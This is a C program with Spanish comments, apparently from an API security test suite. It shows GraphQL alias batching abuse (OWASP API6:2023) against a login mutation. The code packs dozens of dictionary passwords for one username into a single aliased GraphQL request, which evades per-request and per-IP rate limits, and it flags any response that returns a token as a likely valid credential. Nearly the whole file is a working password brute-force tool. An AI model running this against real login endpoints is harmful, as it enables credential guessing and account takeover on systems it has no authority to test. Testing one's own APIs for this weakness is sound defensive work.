/*
 * graphql_alias_batch.c -- API6:2023 Unrestricted Access to Sensitive
 * Business Flows (abuso de alias/batching)
 *
 * Idea: GraphQL permite pedir el mismo campo/mutacion varias veces en
 * una sola peticion HTTP usando alias (a0:, a1:, ...). Si la API no
 * limita el numero de operaciones por peticion ni aplica rate limiting,
 * se puede probar un diccionario entero de contraseñas contra el login
 * en una sola llamada de red (o en pocas llamadas), evadiendo
 * limitadores por-peticion o por-IP ingenuos.
 *
 * Este programa arma UNA mutation con N alias de login, cada uno con una
 * contraseña distinta tomada de un diccionario, usando el mismo usuario.
 *
 * Ajusta la plantilla de la mutation (MUTATION_TPL) al esquema real que
 * defina el equipo para el servicio de Usuarios/Pagos expuesto via
 * GraphQL (Consulta).
 *
 * Uso:
 *   ./graphql_alias_batch <url_graphql> <usuario> <archivo_diccionario> <lote>
 *
 * <lote> = cuantos alias van en cada peticion HTTP (ej. 50).
 */
#include <curl/curl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "common.h"

#define MAX_LINEA 128

static int leer_siguiente_lote(FILE *f, char claves[][MAX_LINEA], int lote) {
    int n = 0;
    while (n < lote && fgets(claves[n], MAX_LINEA, f)) {
        claves[n][strcspn(claves[n], "\r\n")] = '\0';
        if (claves[n][0] != '\0') n++;
    }
    return n;
}

/* escapa comillas dobles para no romper el JSON */
static void escapar(const char *in, char *out, size_t outlen) {
    size_t j = 0;
    for (size_t i = 0; in[i] && j + 2 < outlen; i++) {
        if (in[i] == '"' || in[i] == '\\') out[j++] = '\\';
        out[j++] = in[i];
    }
    out[j] = '\0';
}

int main(int argc, char **argv) {
    if (argc != 5) {
        fprintf(stderr,
            "Uso: %s <url_graphql> <usuario> <archivo_diccionario> <lote>\n",
            argv[0]);
        return 1;
    }
    const char *url = argv[1];
    const char *usuario = argv[2];
    FILE *dicc = fopen(argv[3], "r");
    if (!dicc) { perror("fopen diccionario"); return 1; }
    int lote = atoi(argv[4]);

    char usuario_esc[256];
    escapar(usuario, usuario_esc, sizeof(usuario_esc));

    curl_global_init(CURL_GLOBAL_DEFAULT);
    char (*claves)[MAX_LINEA] = malloc(sizeof(char[lote][MAX_LINEA]));
    char *query = malloc(64 + (size_t)lote * 256);
    int total_probadas = 0, peticiones = 0;

    int n;
    while ((n = leer_siguiente_lote(dicc, claves, lote)) > 0) {
        char *p = query;
        p += sprintf(p, "{\"query\":\"mutation { ");
        for (int i = 0; i < n; i++) {
            char clave_esc[256];
            escapar(claves[i], clave_esc, sizeof(clave_esc));
            p += sprintf(p, "a%d: login(username: \\\"%s\\\", pass: \\\"%s\\\") { token } ", i, usuario_esc, clave_esc);
        }
        p += sprintf(p, "}\"}");

        CURL *curl = curl_easy_init();
        buffer_t buf; buffer_init(&buf);
        struct curl_slist *headers = NULL;
        headers = curl_slist_append(headers, "Content-Type: application/json");

        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, query);
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, buffer_write_cb);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &buf);
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 15L);

        CURLcode res = curl_easy_perform(curl);
        long status = 0;
        if (res == CURLE_OK) curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &status);
        peticiones++;
        total_probadas += n;

        int encontro_token = buf.data && strstr(buf.data, "\"token\":\"") != NULL
                              && strstr(buf.data, "\"token\":null") == NULL;

        char detalle[64];
        snprintf(detalle, sizeof(detalle), "lote de %d alias en 1 peticion", n);
        log_result("AliasBatch/API6", url, status,
                    encontro_token ? "VULNERABLE(token!)" : "sin exito", detalle);

        if (encontro_token) {
            printf(">>> Posible credencial valida en este lote, revisa la respuesta:\n%s\n",
                   buf.data);
        }

        curl_slist_free_all(headers);
        buffer_free(&buf);
        curl_easy_cleanup(curl);
    }

    printf("\nResumen alias/batch: %d claves probadas en %d peticiones HTTP "
           "(usuario=%s).\n", total_probadas, peticiones, usuario);
    printf("En modo blindado se espera: limite de operaciones por peticion "
           "y/o rate limiting que corte esto mucho antes.\n");

    free(claves);
    free(query);
    fclose(dicc);
    curl_global_cleanup();
    return 0;
}
